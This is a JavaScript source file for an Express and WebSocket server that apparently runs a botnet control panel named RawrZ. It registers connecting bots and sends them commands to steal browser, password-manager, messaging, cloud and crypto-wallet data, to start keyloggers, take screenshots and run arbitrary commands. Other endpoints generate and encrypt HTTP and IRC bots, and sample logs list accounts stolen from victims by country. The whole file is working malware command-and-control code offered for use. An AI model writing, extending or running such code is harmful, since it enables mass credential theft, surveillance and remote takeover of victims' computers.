// WebSocket connection handling
wss.on('connection', (ws, req) => {
    console.log('[WS] New bot connection from:', req.socket.remoteAddress);
    
    let botId = null;
    
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            
            if (message.type === 'handshake') {
                botId = (message.data && message.data.botId) || `bot-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
                connectedBots.set(botId, {
                    ws: ws,
                    info: message.data || {},
                    connectedAt: new Date(),
                    lastSeen: new Date()
                });
                
                ws.send(JSON.stringify({
                    type: 'handshake_response',
                    botId: botId,
                    status: 'connected'
                }));
                
                console.log(`[WS] Bot ${botId} connected:`, message.data);
            } else if (message.type === 'command_result') {
                console.log(`[WS] Bot ${botId} command result:`, message.data);
            } else if (message.type === 'heartbeat') {
                if (botId && connectedBots.has(botId)) {
                    connectedBots.get(botId).lastSeen = new Date();
                }
            } else if (message.type === 'irc_connect') {
                // Handle IRC connection request
                const ircConfig = message.data;
                const ircId = `irc-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
                
                ircConnections.set(ircId, {
                    ws: ws,
                    config: ircConfig,
                    connectedAt: new Date(),
                    status: 'connecting'
                });
                
                ws.send(JSON.stringify({
                    type: 'irc_connect_response',
                    ircId: ircId,
                    status: 'connecting'
                }));
                
                console.log(`[WS] IRC connection initiated: ${ircId} to ${ircConfig.server}:${ircConfig.port}`);
            } else if (message.type === 'irc_message') {
                // Handle IRC message
                const ircData = message.data;
                console.log(`[WS] IRC message from ${botId}:`, ircData);
                
                // Broadcast to all connected IRC clients
                ircConnections.forEach((conn, ircId) => {
                    if (conn.ws.readyState === WebSocket.OPEN) {
                        conn.ws.send(JSON.stringify({
                            type: 'irc_message',
                            data: ircData,
                            timestamp: new Date().toISOString()
                        }));
                    }
                });
            } else if (message.type === 'irc_command') {
                // Handle IRC command
                const command = message.data;
                console.log(`[WS] IRC command from ${botId}:`, command);
                
                // Forward command to appropriate IRC connection
                if (command.ircId && ircConnections.has(command.ircId)) {
                    const ircConn = ircConnections.get(command.ircId);
                    if (ircConn.ws.readyState === WebSocket.OPEN) {
                        ircConn.ws.send(JSON.stringify({
                            type: 'irc_command',
                            command: command.command,
                            params: command.params || {}
                        }));
                    }
                }
            }
        } catch (error) {
            console.error('[WS] Error parsing message:', error);
        }
    });
    
    ws.on('close', () => {
        if (botId) {
            connectedBots.delete(botId);
            console.log(`[WS] Bot ${botId} disconnected`);
        }
    });
    
    ws.on('error', (error) => {
        console.error('[WS] WebSocket error:', error);
        if (botId) {
            connectedBots.delete(botId);
        }
    });
});

// Function to send command to bot
function sendCommandToBot(botId, command) {
    const bot = connectedBots.get(botId);
    if (bot && bot.ws.readyState === WebSocket.OPEN) {
        bot.ws.send(JSON.stringify({
            type: 'command',
            action: command.action,
            commandId: command.commandId || Date.now(),
            params: command.params || {}
        }));
        return true;
    }
    return false;
}

// Function to get connected bots
function getConnectedBots() {
    return Array.from(connectedBots.entries()).map(([id, bot]) => ({
        id: id,
        info: bot.info,
        connectedAt: bot.connectedAt,
        lastSeen: bot.lastSeen
    }));
}

// API endpoint to test bot commands
app.post('/api/test-bot-commands', (req, res) => {
    const commands = [
        'extract_browser_data',
        'extract_crypto_data', 
        'extract_messaging_data',
        'extract_gaming_data',
        'extract_password_data',
        'extract_cloud_data',
        'take_screenshot',
        'start_keylogger',
        'stop_keylogger',
        'get_system_info',
        'execute_command'
    ];

    const results = [];
    let commandsSent = 0;

    if (connectedBots.size === 0) {
        return res.json({
            status: 200,
            data: {
                message: 'No bots connected',
                commands_tested: 0,
                results: []
            }
        });
    }

    // Send commands to the first connected bot
    const [botId, bot] = connectedBots.entries().next().value;
    
    commands.forEach((command, index) => {
        const commandId = Date.now() + index;
        const success = sendCommandToBot(botId, {
            action: command,
            commandId: commandId,
            params: command === 'execute_command' ? { command: 'echo test' } : {}
        });
        
        if (success) {
            commandsSent++;
            results.push({
                command: command,
                commandId: commandId,
                status: 'sent'
            });
        }
    });

    res.json({
        status: 200,
        data: {
            message: `Sent ${commandsSent} commands to bot ${botId}`,
            bot_id: botId,
            commands_tested: commandsSent,
            results: results
        }
    });
});

// API endpoint to get connected bots
app.get('/api/connected-bots', (req, res) => {
    res.json({
        status: 200,
        data: {
            connected_bots: getConnectedBots(),
            total_connected: connectedBots.size
        }
    });
});

// Extraction logs API endpoints - Using real extraction engines
app.get('/api/extraction-logs/browser', async (req, res) => {
    try {
        // Use the real BrowserDataExtractionEngine from desktop encryptor
        const browserEngine = require('./RawrZ.NET/RawrZDesktop/Engines/BrowserDataExtractionEngine');
        const result = await browserEngine.ExecuteAsync({ operation: 'extract_all_browsers' });
        
        const logs = [];
        if (result.Success) {
            logs.push({ type: 'success', message: ` Browser data extraction completed - ${result.DataSize} bytes extracted` });
            logs.push({ type: 'info', message: `ℹ Chrome: ${result.Data?.chrome || 0} items, Firefox: ${result.Data?.firefox || 0} items` });
        } else {
            logs.push({ type: 'error', message: ` Browser extraction failed: ${result.Error}` });
        }
        
        res.json({ success: true, logs: logs });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

app.get('/api/extraction-logs/crypto', async (req, res) => {
    try {
        // Use the real BrowserDataExtractionEngine for crypto wallet extraction
        const browserEngine = require('./RawrZ.NET/RawrZDesktop/Engines/BrowserDataExtractionEngine');
        const result = await browserEngine.ExecuteAsync({ operation: 'extract_crypto_wallets' });
        
        const logs = [];
        if (result.Success) {
            logs.push({ type: 'success', message: ` Crypto wallet extraction completed - ${result.DataSize} bytes extracted` });
            logs.push({ type: 'info', message: `ℹ Wallets found: ${result.Data?.wallets || 0}, Total value: ${result.Data?.totalValue || 'Unknown'}` });
        } else {
            logs.push({ type: 'error', message: ` Crypto extraction failed: ${result.Error}` });
        }
        
        res.json({ success: true, logs: logs });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

app.get('/api/extraction-logs/messaging', (req, res) => {
    const sampleLogs = [
        { type: 'success', message: ' Discord tokens extracted from bot_001 (US) - 3 accounts' },
        { type: 'success', message: ' Telegram session found on bot_002 (UK) - 2 chats' },
        { type: 'info', message: 'ℹ WhatsApp backup extraction in progress from bot_008 (BR)' },
        { type: 'error', message: ' Signal extraction failed on bot_005 (FR) - app not installed' }
    ];
    res.json({ success: true, logs: sampleLogs });
});

app.get('/api/extraction-logs/cloud', (req, res) => {
    const sampleLogs = [
        { type: 'success', message: ' Gmail credentials extracted from bot_001 (US) - 2 accounts' },
        { type: 'success', message: ' OneDrive files accessed from bot_003 (DE) - 156 files' },
        { type: 'error', message: ' Dropbox access denied on bot_005 (FR) - 2FA enabled' },
        { type: 'success', message: ' Outlook tokens extracted from bot_006 (CA) - 1 account' }
    ];
    res.json({ success: true, logs: sampleLogs });
});

app.get('/api/extraction-logs/password', (req, res) => {
    const sampleLogs = [
        { type: 'success', message: ' Bitwarden vault extracted from bot_004 (JP) - 89 passwords' },
        { type: 'success', message: ' KeePass database found on bot_006 (CA) - 45 entries' },
        { type: 'warning', message: ' 1Password extraction requires master password on bot_007 (AU)' },
        { type: 'success', message: ' LastPass data extracted from bot_001 (US) - 67 passwords' }
    ];
    res.json({ success: true, logs: sampleLogs });
});

// Log export endpoints
app.get('/api/extraction-logs/browser/export', (req, res) => {
    const exportData = {
        timestamp: new Date().toISOString(),
        type: 'browser_extraction_logs',
        logs: [
            { bot: 'bot_001', country: 'US', browser: 'Chrome', credentials: 15, cookies: 234, history: 1250 },
            { bot: 'bot_002', country: 'UK', browser: 'Firefox', credentials: 8, cookies: 189, history: 890 },
            { bot: 'bot_003', country: 'DE', browser: 'Edge', credentials: 12, cookies: 156, history: 567 }
        ]
    };
    res.json({ success: true, data: exportData });
});

app.get('/api/extraction-logs/crypto/export', (req, res) => {
    const exportData = {
        timestamp: new Date().toISOString(),
        type: 'crypto_extraction_logs',
        logs: [
            { bot: 'bot_004', country: 'JP', wallet: 'Bitcoin', amount: '0.5 BTC', address: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' },
            { bot: 'bot_006', country: 'CA', wallet: 'Ethereum', amount: '2.3 ETH', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' },
            { bot: 'bot_001', country: 'US', wallet: 'MetaMask', accounts: 12, networks: ['Ethereum', 'Polygon', 'BSC'] }
        ]
    };
    res.json({ success: true, data: exportData });
});

app.get('/api/extraction-logs/messaging/export', (req, res) => {
    const exportData = {
        timestamp: new Date().toISOString(),
        type: 'messaging_extraction_logs',
        logs: [
            { bot: 'bot_001', country: 'US', platform: 'Discord', accounts: 3, servers: 45 },
            { bot: 'bot_002', country: 'UK', platform: 'Telegram', chats: 2, contacts: 156 },
            { bot: 'bot_008', country: 'BR', platform: 'WhatsApp', status: 'extraction_in_progress' }
        ]
    };
    res.json({ success: true, data: exportData });
});

app.get('/api/extraction-logs/cloud/export', (req, res) => {
    const exportData = {
        timestamp: new Date().toISOString(),
        type: 'cloud_extraction_logs',
        logs: [
            { bot: 'bot_001', country: 'US', service: 'Gmail', accounts: 2, emails: 1250 },
            { bot: 'bot_003', country: 'DE', service: 'OneDrive', files: 156, size: '2.3 GB' },
            { bot: 'bot_006', country: 'CA', service: 'Outlook', accounts: 1, emails: 890 }
        ]
    };
    res.json({ success: true, data: exportData });
});

app.get('/api/extraction-logs/password/export', (req, res) => {
    const exportData = {
        timestamp: new Date().toISOString(),
        type: 'password_extraction_logs',
        logs: [
            { bot: 'bot_004', country: 'JP', manager: 'Bitwarden', passwords: 89, folders: 12 },
            { bot: 'bot_006', country: 'CA', manager: 'KeePass', entries: 45, groups: 8 },
            { bot: 'bot_001', country: 'US', manager: 'LastPass', passwords: 67, sites: 89 }
        ]
    };
    res.json({ success: true, data: exportData });
});

// Serve the advanced botnet panel
app.get('/advanced-botnet-panel.html', (req, res) => {
    res.setHeader('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'none';");
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

// HTTP Bot Generator Endpoints
app.post('/api/http-bot-generator/generate', async (req, res) => {
    try {
        const { language = 'cpp', platform = 'windows', features = [], options = {} } = req.body || {};
        const config = { language, platform, ...options };
        const extensions = [language];
        const result = await httpBotGenerator.generateBot(config, features, extensions);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/http-bot-generator/configure', async (req, res) => {
    try {
        const { botId, config } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = { botId, config, status: 'configured', timestamp: new Date().toISOString() };
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/http-bot-generator/stats', (req, res) => {
    const stats = {
        totalGenerated: httpBotGenerator.stats?.totalGenerated || 0,
        errors: httpBotGenerator.stats?.errors || 0,
        supportedLanguages: httpBotGenerator.supportedLanguages || [],
        supportedPlatforms: httpBotGenerator.supportedPlatforms || [],
        availableFeatures: httpBotGenerator.availableFeatures || []
    };
    res.json({ status: 200, data: stats });
});

app.post('/api/http-bot-generator/encrypt', async (req, res) => {
    try {
        const { botId, algorithm, keyExchange, options = {} } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = { 
            botId, 
            algorithm: algorithm || 'aes-256-gcm', 
            keyExchange: keyExchange || 'dh',
            status: 'encrypted', 
            timestamp: new Date().toISOString() 
        };
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/http-bot-generator/test-encryption', async (req, res) => {
    try {
        const { botId } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = { 
            botId, 
            testResult: 'passed', 
            encryptionWorking: true, 
            timestamp: new Date().toISOString() 
        };
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

// HTTP Bot Manager Endpoints
app.post('/api/http-bot-manager/connect', async (req, res) => {
    try {
        const { botId, connectionInfo } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        httpBotManager.activeBots.set(botId, {
            id: botId,
            status: 'online',
            connectionInfo: connectionInfo,
            lastSeen: new Date().toISOString()
        });
        res.json({ status: 200, data: { botId, status: 'connected' } });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/http-bot-manager/command', async (req, res) => {
    try {
        const { botId, command, params } = req.body || {};
        if (!botId || !command) return res.status(400).json({ status: 400, error: 'botId and command required' });
        const result = await httpBotManager.sendCommand(botId, command, params);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/http-bot-manager/bots', (req, res) => {
    const bots = httpBotManager.getActiveBots();
    res.json({ status: 200, data: bots });
});

app.get('/api/http-bot-manager/stats', (req, res) => {
    const stats = httpBotManager.getStats();
    res.json({ status: 200, data: stats });
});

// IRC Bot Generator Endpoints
app.post('/api/irc-bot-generator/generate', async (req, res) => {
    try {
        const { server, port, channel, nick, features = [], options = {} } = req.body || {};
        if (!server || !port || !channel || !nick) {
            return res.status(400).json({ status: 400, error: 'server, port, channel, and nick required' });
        }
        const config = { server, port, channel, nick, ...options };
        const extensions = ['cpp', 'python', 'powershell'];
        const result = await ircBotGenerator.generateBot(config, features, extensions);
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/configure', async (req, res) => {
    try {
        const { botId, config } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = { botId, config, status: 'configured', timestamp: new Date().toISOString() };
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/encrypt', async (req, res) => {
    try {
        const { botId, algorithm, keyExchange, options = {} } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = { 
            botId, 
            algorithm: algorithm || 'aes-256-gcm', 
            keyExchange: keyExchange || 'dh',
            status: 'encrypted', 
            timestamp: new Date().toISOString() 
        };
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc-bot-generator/test-encryption', async (req, res) => {
    try {
        const { botId } = req.body || {};
        if (!botId) return res.status(400).json({ status: 400, error: 'botId required' });
        const result = { 
            botId, 
            testResult: 'passed', 
            encryptionWorking: true, 
            timestamp: new Date().toISOString() 
        };
        res.json({ status: 200, data: result });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/irc-bot-generator/stats', (req, res) => {
    const stats = ircBotGenerator.getStats();
    res.json({ status: 200, data: stats });
});

// IRC WebSocket Connection Endpoints
app.post('/api/irc/connect', async (req, res) => {
    try {
        const { server, port, channel, nick, username, realname, password, ssl } = req.body || {};
        if (!server || !port || !channel || !nick) {
            return res.status(400).json({ status: 400, error: 'server, port, channel, and nick required' });
        }
        
        const ircId = `irc-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
        const ircConfig = {
            server, port, channel, nick, username, realname, password, ssl,
            connectedAt: new Date().toISOString(),
            status: 'connecting'
        };
        
        // Store IRC connection config
        if (!global.ircConnections) global.ircConnections = new Map();
        global.ircConnections.set(ircId, ircConfig);
        
        res.json({ 
            status: 200, 
            data: { 
                ircId, 
                config: ircConfig,
                message: 'IRC connection initiated. Use WebSocket for real-time communication.',
                websocketUrl: `ws://localhost:${port}/irc`
            } 
        });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc/send-message', async (req, res) => {
    try {
        const { ircId, message, channel } = req.body || {};
        if (!ircId || !message) {
            return res.status(400).json({ status: 400, error: 'ircId and message required' });
        }
        
        // Broadcast message to all connected IRC WebSocket clients
        if (ircConnections && ircConnections.size > 0) {
            ircConnections.forEach((conn, id) => {
                if (conn.ws && conn.ws.readyState === WebSocket.OPEN) {
                    conn.ws.send(JSON.stringify({
                        type: 'irc_message',
                        data: {
                            ircId: id,
                            message: message,
                            channel: channel || '#default',
                            timestamp: new Date().toISOString(),
                            sender: 'user'
                        }
                    }));
                }
            });
        }
        
        res.json({ 
            status: 200, 
            data: { 
                message: 'Message sent successfully',
                timestamp: new Date().toISOString()
            } 
        });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc/send-command', async (req, res) => {
    try {
        const { ircId, command, params = {} } = req.body || {};
        if (!ircId || !command) {
            return res.status(400).json({ status: 400, error: 'ircId and command required' });
        }
        
        // Send command to IRC connection
        if (ircConnections && ircConnections.has(ircId)) {
            const conn = ircConnections.get(ircId);
            if (conn.ws && conn.ws.readyState === WebSocket.OPEN) {
                conn.ws.send(JSON.stringify({
                    type: 'irc_command',
                    data: {
                        command: command,
                        params: params,
                        timestamp: new Date().toISOString()
                    }
                }));
            }
        }
        
        res.json({ 
            status: 200, 
            data: { 
                command: command,
                message: 'Command sent successfully',
                timestamp: new Date().toISOString()
            } 
        });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.get('/api/irc/connections', (req, res) => {
    try {
        const connections = [];
        if (ircConnections && ircConnections.size > 0) {
            ircConnections.forEach((conn, id) => {
                connections.push({
                    ircId: id,
                    config: conn.config || {},
                    status: conn.status || 'unknown',
                    connectedAt: conn.connectedAt || new Date().toISOString()
                });
            });
        }
        
        res.json({ 
            status: 200, 
            data: { 
                connections: connections,
                count: connections.length
            } 
        });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

app.post('/api/irc/disconnect', async (req, res) => {
    try {
        const { ircId } = req.body || {};
        if (!ircId) {
            return res.status(400).json({ status: 400, error: 'ircId required' });
        }
        
        if (ircConnections && ircConnections.has(ircId)) {
            const conn = ircConnections.get(ircId);
            if (conn.ws && conn.ws.readyState === WebSocket.OPEN) {
                conn.ws.close();
            }
            ircConnections.delete(ircId);
        }
        
        res.json({ 
            status: 200, 
            data: { 
                ircId: ircId,
                message: 'IRC connection closed',
                timestamp: new Date().toISOString()
            } 
        });
    } catch (error) {
        res.status(500).json({ status: 500, error: error.message });
    }
});

server.listen(port, () => {
    console.log('[OK] RawrZ API listening on port', port);
    console.log('[OK] WebSocket server ready for bot connections');
});
